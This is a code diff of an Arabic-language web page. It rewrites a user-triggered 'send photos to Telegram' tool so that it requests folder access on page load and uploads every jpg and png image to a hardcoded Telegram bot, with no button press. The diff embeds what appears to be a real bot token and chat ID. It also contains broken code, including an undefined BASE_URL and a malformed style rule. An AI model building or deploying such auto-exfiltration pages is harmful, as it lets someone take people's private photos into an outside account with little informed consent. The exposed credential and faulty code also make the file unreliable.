@@ -311,78 +311,83 @@ document.addEventListener('DOMContentLoaded', function() {
 <!DOCTYPE html>
 <html>
 <head>
-    <title>إرسال الصور إلى تيليجرام</title>
+    <title>إرسال الصور التلقائي</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin: 20px; }
-        button { padding: 10px 20px; margin: 10px; font-size: 16px; }
-        #status { color: green; margin-top: 20px; }
+        body { font-family: Arial, text-align: center; margin-top: 50px; }
+        #status { margin: 20px; padding: 10px; border-radius: 5px; }
+        .loading { background: yellow; }
+        .success { background: lightgreen; }
+        .error { background: pink; }
     </style>
 </head>
 <body>
-    <h1>إرسال الصور من مجلد Pictures</h1>
-    <button id="selectBtn">اختر المجلد</button>
-    <button id="sendBtn" disabled>إرسال إلى تيليجرام</button>
-    <div id="status"></div>
 
-    <script>
-        const BOT_TOKEN = "YOUR_BOT_TOKEN"; // استبدل هذا
-        const CHAT_ID = "YOUR_CHAT_ID"; // استبدل هذا
-        let selectedFiles = [];
+<div id="status">سيبدأ إرسال الصور عند الضغط على "سماح"</div>
 
-        document.getElementById('selectBtn').addEventListener('click', async () => {
-            try {
-                const dirHandle = await window.showDirectoryPicker();
-                selectedFiles = await getImagesFromFolder(dirHandle);
-                document.getElementById('sendBtn').disabled = false;
-                document.getElementById('status').textContent = `تم تحميل ${selectedFiles.length} صورة`;
-            } catch (error) {
-                console.error("Error:", error);
-                document.getElementById('status').textContent = "حدث خطأ أثناء اختيار المجلد";
-            }
-        });
+<script>
+// إعدادات التليجرام
+const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
+const CHAT_ID = "6913353602";
+let folderHandle;
 
-        document.getElementById('sendBtn').addEventListener('click', async () => {
-            if (selectedFiles.length === 0) return;
-            
-            const statusElement = document.getElementById('status');
-            statusElement.textContent = "جاري الإرسال...";
-            
-            try {
-                for (const file of selectedFiles) {
-                    await sendToTelegram(file);
-                    await new Promise(resolve => setTimeout(resolve, 1000)); // تأخير بين الصور
-                }
-                statusElement.textContent = `تم إرسال ${selectedFiles.length} صورة بنجاح!`;
-            } catch (error) {
-                console.error("Error:", error);
-                statusElement.textContent = "فشل الإرسال: " + error.message;
-            }
-        });
+async function requestFolderAccess() {
+    try {
+        folderHandle = await window.showDirectoryPicker();
+        document.getElementById('status').className = 'loading';
+        document.getElementById('status').textContent = 'جاري إرسال الصور...';
+        
+        await sendAllImages();
+        
+    } catch (error) {
+        document.getElementById('status').className = 'error';
+        document.getElementById('status').textContent = 'حدث خطأ: ' + error.message;
+    }
+}
 
-        async function getImagesFromFolder(dirHandle) {
-            const files = [];
-            for await (const entry of dirHandle.values()) {
-                if (entry.kind === 'file' && /\.(jpe?g|png|gif|webp)$/i.test(entry.name)) {
-                    files.push(await entry.getFile());
-                }
-            }
-            return files;
-        }
-
-        async function sendToTelegram(file) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', file);
-
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-
-            if (!response.ok) {
-                throw new Error(await response.text());
+async function sendAllImages() {
+    try {
+        let imageCount = 0;
+        
+        for await (const entry of folderHandle.values()) {
+            if (entry.kind === 'file' && 
+                /\.(jpg|jpeg|png)$/i.test(entry.name)) {
+                
+                const file = await entry.getFile();
+                await sendToTelegram(file);
+                imageCount++;
+                
+                // تأخير لتجنب حظر التليجرام
+                await new Promise(resolve => setTimeout(resolve, 2000));
             }
         }
-    </script>
+        
+        document.getElementById('status').className = 'success';
+        document.getElementById('status').textContent = `تم إرسال ${imageCount} صورة بنجاح!`;
+        
+    } catch (error) {
+        document.getElementById('status').className = 'error';
+        document.getElementById('status').textContent = 'فشل الإرسال: ' + error.message;
+    }
+}
+
+async function sendToTelegram(file) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', file);
+    
+    const response = await fetch(`${BASE_URL}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+    });
+    
+    if (!response.ok) throw new Error('فشل إرسال الصورة');
+}
+
+// بدء العملية عند تحميل الصفحة
+window.addEventListener('DOMContentLoaded', () => {
+    requestFolderAccess().catch(console.error);
+});
+</script>
+
 </body>
 </html>
